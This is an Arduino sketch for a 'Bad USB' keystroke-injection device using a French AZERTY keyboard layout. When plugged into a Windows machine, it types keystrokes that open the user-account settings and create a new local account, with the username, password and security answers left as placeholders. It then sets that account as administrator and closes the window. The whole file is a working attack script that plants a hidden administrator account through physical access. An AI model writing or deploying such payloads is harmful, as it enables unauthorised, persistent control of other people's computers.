// You can set yourself the delay you want by testing, the delay here is always the same.
// PLEASE plug in second USB in before Bad USB.

#include <KeyboardAzertyFr.h>

// Init function
void setup() 
{
  // Begining the stream
  KeyboardAzertyFr.begin();
  
  // Waiting 500ms for init
  delay(500);

  // Press Windows + r
  KeyboardAzertyFr.press(KEY_LEFT_GUI);
  KeyboardAzertyFr.press('r');
  KeyboardAzertyFr.releaseAll();

  delay(300);

  // Print (go to specific parameters)
  KeyboardAzertyFr.print("ms-settings:otherusers");

  delay(300);

  // Press return
  typeKey(KEY_RETURN);

  delay(1000);

  // Press tab 10 times
  pressTab(10);

  delay(500);
  
  // Press return
  typeKey(KEY_RETURN);

  delay(2000);

  // Press Tab
  typeKey(KEY_TAB);

  delay(300);

  // Press return
  typeKey(KEY_RETURN);

  delay(3000);  

  // Press tab 3 times
  pressTab(3);
  
  delay(300);

  // Press return
  typeKey(KEY_RETURN);

  delay(300);

  // Print (put the username)
  KeyboardAzertyFr.print("YOUR_USERNAME_HERE");

  delay(300);

  // Press Tab
  typeKey(KEY_TAB);

  delay(300);

  // Print (put the password)
  KeyboardAzertyFr.print("YOUR_PASSWORD_HERE");

  delay(300);

  // Press Tab
  typeKey(KEY_TAB); 

  delay(300);

  // Print (repeat the password)
  KeyboardAzertyFr.print("YOUR_PASSWORD_HERE");  

  delay(300);

  securityQuestion(6);

  delay(300);

  // Press tab 2 times
  pressTab(2);

  delay(300);

  // Press return
  typeKey(KEY_RETURN);

  delay(1500);
  
  putAsAdministrator();

  delay(300);

  // Close
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.press(KEY_F4);
  KeyboardAzertyFr.releaseAll();
 
}   

void typeKey(int key)
{
  KeyboardAzertyFr.press(key);
  delay(50);
  KeyboardAzertyFr.release(key);
}

// Function pressing tab the desired number of times
void pressTab(int number)
{
  for (int i = 0; i < number; i++)
  {
    typeKey(KEY_TAB);
    delay(200);
  }
}

// Function filling in the security questions
void securityQuestion(int number)
{
    for (int i = 0; i < number; i++)
  {
    typeKey(KEY_TAB);
    delay(300);
    typeKey(KEY_DOWN_ARROW);
    delay(300);
    KeyboardAzertyFr.print("YOUR_ANSWER_HERE");
  }

}

// Function defining the account as an administrator
void putAsAdministrator ()
{
  typeKey(KEY_TAB);
  delay(300);
  typeKey(KEY_RETURN);
  delay(300);
  typeKey(KEY_TAB);
  delay(300);
  typeKey(KEY_RETURN);
  delay(300);
  typeKey(KEY_UP_ARROW);
  delay(300); 
  typeKey(KEY_TAB);
  delay(300);
  typeKey(KEY_RETURN);
}

// Nothing here   
void loop() {}
